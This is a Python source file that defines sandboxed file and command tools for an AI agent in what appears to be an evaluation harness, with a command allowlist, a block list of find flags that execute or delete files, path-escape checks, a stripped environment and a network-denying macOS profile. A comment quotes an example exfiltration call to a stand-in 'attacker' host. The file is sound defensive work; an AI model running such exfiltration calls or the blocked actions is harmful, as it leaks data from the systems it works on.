"""Tool definitions and execution for the agent."""

from __future__ import annotations

import os
import shlex
import subprocess
import sys
import time
from pathlib import Path
from typing import Any

from llmeval.sandbox import Sandbox

# Commands allowed in the run tool
ALLOWED_COMMANDS = {
    "ls", "cat", "wc", "grep", "find", "sort", "uniq", "head", "tail",
    "cut", "python3", "diff", "echo", "mkdir", "cp", "mv", "rm", "touch",
    "file", "stat", "du", "df", "xargs", "tr", "tee", "dirname", "basename",
    "readlink", "realpath",
}

# find flags that can exec or delete files — blocked even though find is allowed
DANGEROUS_FIND_FLAGS = {"-exec", "-execdir", "-ok", "-okdir", "-fprint", "-fprintf", "-fls", "-delete"}

# Minimal allowed environment for subprocess: no API keys, no shell secrets.
# HOME / TMPDIR point into the sandbox so ~ and $TMPDIR are harmless.
_SAFE_ENV_KEYS = {"PATH", "LANG", "LC_ALL", "USER"}


def _safe_env(sandbox: Sandbox) -> dict[str, str]:
    """Return a minimal env dict for subprocess; no API keys inherited."""
    env = {k: os.environ[k] for k in _SAFE_ENV_KEYS if k in os.environ}
    env.setdefault("PATH", "/usr/bin:/bin:/usr/sbin")
    env.setdefault("LANG", "C.UTF-8")
    env["HOME"] = str(sandbox.root)
    env["TMPDIR"] = str(sandbox.root)
    env["PYTHONDONTWRITEBYTECODE"] = "1"
    return env


# Commands whose positional args are NOT file paths (code, patterns, strings).
# Values: number of initial positionals to skip, or None to skip ALL positionals.
_NONPATH_SKIP: dict[str, int | None] = {
    "grep":    1,   # first positional is the regex pattern
    "egrep":   1,
    "fgrep":   1,
    "echo":    None,  # every positional is a string to print
    "tr":      2,   # string1 string2
}


def _validate_args(argv: list[str], sandbox: Sandbox) -> str | None:
    """Validate path-like args stay inside the sandbox.  Returns error or None.

    Does NOT mutate argv — non-path args (python3 -c code, grep regex, echo
    strings) are skipped based on _NONPATH_SKIP.  python3 is handled specially:
    only the arg immediately after -c / -m is skipped (the code or module
    name); the script path and all other args are validated as paths.

    Every other non-flag arg is resolved through Sandbox.resolve() to catch
    symlink escapes and ".." traversal without corrupting the command.
    """
    cmd = argv[0]

    # python3: skip the argument after -c or -m (it's code / module name).
    # Validate the script path and everything else.
    if cmd == "python3":
        skip_next = False
        for arg in argv[1:]:
            if skip_next:
                skip_next = False
                continue
            if arg in ("-c", "-m"):
                skip_next = True
                continue
            if arg.startswith("-"):
                continue
            try:
                sandbox.resolve(arg)
            except ValueError:
                return f"Path escapes sandbox: {arg}"
        return None

    skip_spec = _NONPATH_SKIP.get(cmd, 0)  # None = skip all, int = skip N
    remaining = skip_spec  # None means "skip all forever"

    for arg in argv[1:]:
        if arg.startswith("-"):
            continue
        if remaining is None:
            continue  # echo, etc. — skip every positional
        if isinstance(remaining, int) and remaining > 0:
            remaining -= 1
            continue
        # This arg should be treated as a path — resolve to validate containment
        try:
            sandbox.resolve(arg)
        except ValueError:
            return f"Path escapes sandbox: {arg}"
    return None


# macOS sandbox-exec profile — denies network access (Layer 2 from review).
# Stops python3 -c "urlopen('https://attacker/')" from exfiltrating data.
#
# Deny is ordered LAST so it wins under both SBPL semantics
# ("more specific" and "last matching rule").
_SANDBOX_PROFILE = "(version 1)(allow default)(deny network*)"


def _sandbox_exec_prefix() -> list[str]:
    """On macOS, return a sandbox-exec prefix that denies network access.

    Uses -p (inline profile) so there is no tempfile, no atexit cleanup,
    and no race between concurrent runs.  On non-macOS returns [].
    """
    if sys.platform != "darwin":
        return []
    return ["/usr/bin/sandbox-exec", "-p", _SANDBOX_PROFILE]

# JSON schema presented to the model
TOOL_SCHEMA_DESCRIPTION = """
Available tools:
- list_dir: List files and directories. Args: {"path": "relative/path (default '.')"}
- read_file: Read a file's contents. Args: {"path": "relative/path"}
- write_file: Write content to a file. Args: {"path": "relative/path", "content": "text"}
- run: Execute one command per call. Args: {"command": "cmd arg1 arg2 ..."}
       The string is parsed with shlex and passed to subprocess with shell=False;
       no shell interprets it. A subset of common Unix utilities is permitted;
       attempts to use others return an error listing what is allowed.
""".strip()

JSON_SCHEMA = """
Reply with valid JSON ONLY, using exactly this schema:
{
  "thought": "your step-by-step reasoning",
  "tool": null | "list_dir" | "read_file" | "write_file" | "run",
  "tool_args": {},
  "final_answer": null | "your final answer"
}
- Use at most ONE tool per turn.
- Set "final_answer" when you are confident; leave "tool" null.
- Never invent tool results.
""".strip()


def execute_tool(tool: str, tool_args: dict, sandbox: Sandbox, timeout_s: int = 30) -> dict[str, Any]:
    """Execute a tool call and return a result dict."""
    if tool == "list_dir":
        return _list_dir(tool_args, sandbox)
    elif tool == "read_file":
        return _read_file(tool_args, sandbox)
    elif tool == "write_file":
        return _write_file(tool_args, sandbox)
    elif tool == "run":
        return _bash(tool_args, sandbox, timeout_s)
    else:
        return {"ok": False, "error": f"Unknown tool: {tool}"}


def _list_dir(args: dict, sandbox: Sandbox) -> dict:
    rel = args.get("path", ".")
    try:
        p = sandbox.resolve(rel)
    except ValueError as e:
        return {"ok": False, "error": str(e)}
    if not p.exists():
        return {"ok": False, "error": f"Path does not exist: {rel}"}
    if not p.is_dir():
        return {"ok": False, "error": f"Not a directory: {rel}"}

    entries = []
    for child in sorted(p.iterdir()):
        etype = "dir" if child.is_dir() else "file"
        try:
            size = child.stat().st_size if child.is_file() else 0
        except OSError:
            size = 0
        entries.append({
            "name": child.name,
            "type": etype,
            "size_bytes": size,
        })
    return {"ok": True, "entries": entries}


def _read_file(args: dict, sandbox: Sandbox) -> dict:
    rel = args.get("path", "")
    if not rel:
        return {"ok": False, "error": "Missing path argument"}
    try:
        p = sandbox.resolve(rel)
    except ValueError as e:
        return {"ok": False, "error": str(e)}
    if not p.exists():
        return {"ok": False, "error": f"File does not exist: {rel}"}
    if p.is_dir():
        return {"ok": False, "error": f"Path is a directory: {rel}"}
    try:
        content = p.read_text()
        if len(content) > 8000:
            content = content[:8000] + "\n... [TRUNCATED]"
        return {"ok": True, "content": content, "size_bytes": len(content)}
    except Exception as e:
        return {"ok": False, "error": str(e)}


def _write_file(args: dict, sandbox: Sandbox) -> dict:
    rel = args.get("path", "")
    content = args.get("content", "")
    if not rel:
        return {"ok": False, "error": "Missing path argument"}
    try:
        p = sandbox.resolve(rel)
    except ValueError as e:
        return {"ok": False, "error": str(e)}
    try:
        p.parent.mkdir(parents=True, exist_ok=True)
        p.write_text(content)
        return {"ok": True, "written_bytes": len(content), "path": rel}
    except Exception as e:
        return {"ok": False, "error": str(e)}


def _bash(args: dict, sandbox: Sandbox, timeout_s: int) -> dict:
    command = args.get("command", "")
    if not command:
        return {"ok": False, "error": "Missing command argument"}

    # parse first word to check allowlist
    try:
        argv = shlex.split(command)
    except ValueError as e:
        return {"ok": False, "error": f"Invalid shell syntax: {e}"}
    if not argv:
        return {"ok": False, "error": "Empty command"}
    if argv[0] not in ALLOWED_COMMANDS:
        return {"ok": False, "error": f"Command not allowed: {argv[0]}. Allowed: {', '.join(sorted(ALLOWED_COMMANDS))}"}

    # Block dangerous find flags and xargs (both can exec unlisted binaries)
    if argv[0] == "find" and any(a in DANGEROUS_FIND_FLAGS for a in argv):
        return {"ok": False, "error": "find: -exec/-execdir/-ok/-okdir/-delete not allowed"}
    if argv[0] == "xargs":
        return {"ok": False, "error": "xargs not allowed"}

    # Validate path arguments through Sandbox.resolve() to prevent
    # symlink escapes and path-traversal attacks — but do NOT mutate
    # argv (non-path args like python3 -c code or grep regex must be
    # passed verbatim).
    err = _validate_args(argv, sandbox)
    if err:
        return {"ok": False, "error": err}

    started = time.time()
    try:
        # Use shell=False with the already-parsed argv for security.
        # The allowlist check above already validated argv[0].
        # Pass a minimal env so API keys and shell secrets are not leaked.
        proc = subprocess.run(
            _sandbox_exec_prefix() + argv,
            cwd=str(sandbox.root),
            env=_safe_env(sandbox),
            text=True,
            capture_output=True,
            timeout=timeout_s,
        )
        elapsed = round(time.time() - started, 3)
        stdout = proc.stdout[:4000] if proc.stdout else ""
        stderr = proc.stderr[:4000] if proc.stderr else ""
        if len(proc.stdout or "") > 4000:
            stdout += "\n... [TRUNCATED]"
        if len(proc.stderr or "") > 4000:
            stderr += "\n... [TRUNCATED]"
        return {
            "ok": proc.returncode == 0,
            "returncode": proc.returncode,
            "stdout": stdout,
            "stderr": stderr,
            "elapsed_s": elapsed,
        }
    except subprocess.TimeoutExpired:
        return {"ok": False, "error": f"Command timed out after {timeout_s}s"}
    except Exception as e:
        return {"ok": False, "error": str(e)}
